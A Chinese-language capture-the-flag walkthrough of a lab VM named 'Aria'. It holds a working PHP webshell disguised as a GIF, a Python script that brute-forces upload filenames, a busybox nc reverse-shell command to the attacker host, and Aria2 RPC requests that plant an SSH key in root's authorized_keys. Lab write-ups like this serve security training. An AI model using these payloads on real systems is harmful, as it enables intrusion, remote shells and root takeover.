# **一、信息收集**

首先，在本地网络中进行主机发现，以确定目标靶机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:b6:03:66       PCS Systemtechnik GmbH
...
```

从扫描结果中，我们识别出目标IP为 `192.168.205.131`。

接下来，对目标主机进行全端口扫描，以发现其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.131
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
...
```

扫描结果显示开放了三个端口：22 (SSH)、80 (HTTP) 和一个非常见的 1337 端口。为了解 1337 端口上运行的具体服务，我们使用 Nmap 进行服务版本探测和脚本扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p1337 -sC -sV 192.168.205.131
...
PORT     STATE SERVICE VERSION
1337/tcp open  waste?
| fingerprint-strings: 
|   NULL: 
|     --- Aria Internal Service Debug Shell ---
|     --- To exit, type 'exit' ---
|     --- Recent Upload Paths ---
|     Log file not found.
...
```

Nmap 的指纹识别显示，1337 端口上运行着一个名为 "Aria Internal Service Debug Shell" 的服务。该服务似乎会记录并显示最近的文件上传路径，这可能是一个关键的信息泄露点。

# **二、Web 渗透与漏洞利用**

我们首先从最常见的攻击面——Web 服务（80端口）入手。

## **2.1 Web 应用分析**

浏览器访问 `http://192.168.205.131`，页面显示一个文件上传功能。

![image-20250815205048586](http://7r1UMPHK.github.io/image/20250918191856359.webp)

页面上方的提示信息揭示了文件命名的关键逻辑：`md5(time()·rand(1,1000))`。这意味着服务器端会使用当前的时间戳（`time()`）拼接一个 1 到 1000 的随机数，然后计算其 MD5 值作为文件名。同时，提示说明了上传文件的限制：

*   **文件类型**：仅接受 `gif / jpg / png`。这可以通过伪造文件头（如GIF的`GIF89a`）来绕过。
*   **内容限制**：不可包含 `<?php`。这是一个常见的安全过滤，但通常可以用PHP短标签 `<?=` 来绕过，它等同于 `<?php echo`。

## **2.2 漏洞利用 (方案一：利用信息泄露)**

既然1337端口的调试服务会显示上传路径，我们可以利用这个便利来简化攻击流程。

1. **构造 Webshell**
   创建一个名为 `a.gif` 的文件，内容如下。`GIF89a` 是一个合法的GIF文件头，用于绕过文件类型检查。后面跟着我们的PHP一句话木马。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
   └─$ cat a.gif 
   GIF89a
   <?= exec($_GET['0']); ?>
   ```

2. **上传文件并获取路径**
   通过网页的上传功能提交 `a.gif` 文件。然后，访问 `http://192.168.205.131:1337`，从 "Aria Internal Service Debug Shell" 的回显中找到我们刚刚上传文件的确切路径和文件名。

   ![image-20250815210122092](http://7r1UMPHK.github.io/image/20250918191854474.webp)

   从上图可知，文件被保存为 `/uploads/15b8eba93ab6ee04b65169451f0d0653.gif`。

3. **执行命令**
   访问该文件URL，并通过GET参数 `0` 传递要执行的命令。

   `http://192.168.205.131/uploads/15b8eba93ab6ee04b65169451f0d0653.gif?0=id`

   ![image-20250815210213956](http://7r1UMPHK.github.io/image/20250918191922105.webp)

   页面成功返回 `id` 命令的执行结果，确认远程命令执行（RCE）漏洞存在。

## **2.3 漏洞利用 (方案二：无信息泄露场景下的暴力破解)**

在无法访问1337端口的情况下，我们需要根据 `md5(time()·rand(1,1000))` 的命名规则来暴力破解文件名。由于服务器时间与本地时间可能存在细微差别，我们将爆破范围扩大到上传时间的前后一秒。

1. **编写爆破脚本**
   使用以下Python脚本，在上传文件后，立即对可能生成的文件名进行多线程爆破。

   ```python
   import hashlib
   import time
   import requests
   import threading
   from queue import Queue
   
   # ===== 配置 =====
   upload_url = "http://192.168.205.131/upload.php"
   base_url = "http://192.168.205.131/uploads/"
   filename = "a.gif"
   threads = 10
   stop_flag = threading.Event()
   queue = Queue()
   
   # ===== 创建并上传文件 =====
   payload_content = b"GIF89a\n<?= exec($_GET['0']); ?>\n"
   with open(filename, "wb") as f:
       f.write(payload_content)
   
   upload_time = int(time.time())
   with open(filename, "rb") as f:
       files = {"file": (filename, f, "image/gif")}
       requests.post(upload_url, files=files)
   print("[INFO] Upload initiated. Starting brute force...")
   
   # ===== 生成爆破队列 =====
   for t in range(upload_time - 1, upload_time + 2):
       for rand_num in range(1, 1001):
           md5_hash = hashlib.md5(f"{t}{rand_num}".encode()).hexdigest()
           url = f"{base_url}{md5_hash}.gif"
           queue.put(url)
   
   # ===== 工作线程定义与执行 =====
   def worker():
       while not stop_flag.is_set():
           try:
               url = queue.get_nowait()
           except:
               break
           try:
               r = requests.get(url, timeout=2)
               if r.status_code != 404:
                   print(f"\n[FOUND] {url}")
                   stop_flag.set()
           except requests.RequestException:
               pass
           finally:
               queue.task_done()
   
   thread_list = []
   for _ in range(threads):
       t = threading.Thread(target=worker)
       t.start()
       thread_list.append(t)
   
   queue.join()
   stop_flag.set()
   print("\n[INFO] Script finished.")
   ```

2. **执行脚本**
   运行脚本，它会自动完成上传和爆破过程。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
   └─$ python3 a.py
   ...
   [FOUND] http://192.168.205.131/uploads/a06d0c0ae19cab9352271c103cf13055.gif
   ...
   ```

   脚本成功找到了上传后的 Webshell 地址。

# **三、获取 Shell 与提权**

## **3.1 反弹 Shell**

为了更方便地进行交互，我们利用已有的RCE漏洞来获取一个反弹shell。

1. **在Kali上设置监听**

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
   └─$ nc -lvnp 8888                      
   listening on [any] 8888 ...
   ```

2. **触发反弹 Shell**
   在浏览器中访问以下URL，命令目标服务器使用`busybox nc`连接我们的监听端口。

   `http://192.168.205.131/uploads/a06d0c0ae19cab9352271c103cf13055.gif?0=busybox nc 192.168.205.128 8888 -e /bin/bash`

3. **接收 Shell**
   回到Kali终端，我们成功接收到了来自目标服务器的连接。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
   └─$ nc -lvnp 8888                      
   listening on [any] 8888 ...
   connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 49668
   id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

## **3.2 Shell 稳定化**

为了获得一个功能更全的交互式TTY Shell，执行以下命令进行稳定化：

```bash
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## **3.3 用户提权**

在目标系统中搜寻敏感信息，我们发现`user.txt`文件，但其内容包含异常字符。

```bash
www-data@Aria:/var/www/html$ cd /home/aria
www-data@Aria:/home/aria$ ls -al
...
-rw-r--r-- 1 root root  404 Aug 15 00:23 user.txt
www-data@Aria:/home/aria$ cat user.txt
flag{user-d13adadc6bbc1391394a5198cba2d1d7}
​‌‌‌​‌​​​‌‌​‌‌‌‌​‌‌​‌​‌‌​‌‌​​‌​‌​‌‌​‌‌‌​​​‌‌‌​‌​​​‌​​​​​​‌‌​‌‌​‌​‌‌​​​​‌​‌‌‌‌​‌​​‌‌​​‌​‌​​‌​‌‌​‌​‌‌‌​​‌‌​‌‌​​‌​‌​‌‌​​​‌‌
```

这些看似空白的字符实际上是**零宽度字符 (Zero-width characters)**，一种隐写术技术。我们将这段包含隐藏信息的文本复制到在线解码工具（如 [Stegzero](https://stegzero.com/)）中进行解码。

![image-20250815210924708](http://7r1UMPHK.github.io/image/20250918191857357.webp)

解码后得到一个关键信息：`token: maze-sec`。

# **四、内核服务利用与 Root 提权**

## **4.1 内部服务探测**

利用已有的shell，查看目标服务器上监听的网络端口。

```bash
www-data@Aria:/home/aria$ ss -tnlp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         128              127.0.0.1:6800             0.0.0.0:*       
...
```

我们发现一个仅在本地 `127.0.0.1` 监听的端口 `6800`。结合靶机名 "Aria"，我们推测这可能是 **Aria2** 下载工具的RPC服务。

## **4.2 Aria2 RPC 漏洞利用**

Aria2 提供了一个 JSON-RPC 接口用于远程控制。我们来验证这个猜测并尝试利用它。

1. **验证服务**
   使用 `curl` 访问该接口，返回了一个JSON-RPC错误，证实了我们的猜想。

   ```bash
   www-data@Aria:/home/aria$ curl http://127.0.0.1:6800/jsonrpc
   {"id":null,"jsonrpc":"2.0","error":{"code":-32600,"message":"Invalid Request."}}
   ```

2. **绕过认证**
   尝试调用一个方法，如 `aria2.getVersion`，服务返回 "Unauthorized"，说明RPC接口设置了认证。

   ```bash
   www-data@Aria:/home/aria$ curl -s http://127.0.0.1:6800/jsonrpc -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","method":"aria2.getVersion","id":"Q1"}'
   {"id":"Q1","jsonrpc":"2.0","error":{"code":1,"message":"Unauthorized"}}
   ```

   此时，我们联想到之前通过零宽度字符解密得到的 `token: maze-sec`。Aria2 RPC支持使用 `--rpc-secret` 进行令牌认证。我们将此token作为参数加入请求中。

   ```bash
   www-data@Aria:/home/aria$ curl -s http://127.0.0.1:6800/jsonrpc \
   >   -H 'Content-Type: application/json' \
   >   -d '{
   >     "jsonrpc":"2.0",
   >     "method":"aria2.getVersion",
   >     "id":"Q1",
   >     "params":["token:maze-sec"]
   >   }'
   {"id":"Q1","jsonrpc":"2.0","result":{"enabledFeatures":[...],"version":"1.35.0"}}
   ```

   服务器成功返回了版本信息，证明token有效，我们已经获得了Aria2 RPC的控制权。

3. **确定利用路径**
   查看Aria2服务的进程信息，发现它是由 `root` 用户启动的。

   ```bash
   www-data@Aria:/home/aria$ ps aux | grep [a]ria2c
   root         374  0.0  0.2  56656  6040 ?        Ss   08:48   0:01 /usr/bin/aria2c --conf-path=/root/.aria2/aria2.conf
   ```

   由于Aria2以root权限运行，并且其RPC接口允许我们指定下载文件的位置和名称，因此我们可以利用它向系统的任意位置写入任意文件，从而实现提权。

## **4.3 获取 Root 权限**

我们的目标是写入自己的SSH公钥到 `/root/.ssh/authorized_keys` 文件中，从而免密登录root账户。

1. **在Kali上准备并提供公钥文件**
   将你的SSH公钥保存为 `authorized_keys` 文件，并通过一个简单的HTTP服务器使其可以被目标主机访问。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

2. **通过Aria2下载公钥**
   在目标服务器的shell中，发送一个RPC请求，命令Aria2从我们的Kali主机下载 `authorized_keys` 文件，并将其保存到 `/root/.ssh/` 目录下。

   ```bash
   www-data@Aria:/home/aria$ curl -s http://127.0.0.1:6800/jsonrpc \
   >   -H 'Content-Type: application/json' \
   >   -d '{
   >     "jsonrpc":"2.0",
   >     "method":"aria2.addUri",
   >     "id":"add",
   >     "params": [
   >       "token:maze-sec",
   >       ["http://192.168.205.128/authorized_keys"],
   >       { "dir":"/root/.ssh/", "out":"authorized_keys" }
   >     ]
   >   }'
   {"id":"add","jsonrpc":"2.0","result":"d50f7382dd3f927b"}
   ```

3. **SSH登录并获取Flag**
   文件写入成功后，我们现在可以直接以root身份SSH登录到目标主机。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ ssh root@192.168.205.131
   ...
   Last login: Fri Aug 15 01:48:26 2025 from 192.168.1.9
   root@Aria:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Aria:~# cat /root/root.txt
   flag{root-374495cbd5d79b6e45b7778cbac070cc}
   ```

成功获取root权限，渗透测试完成。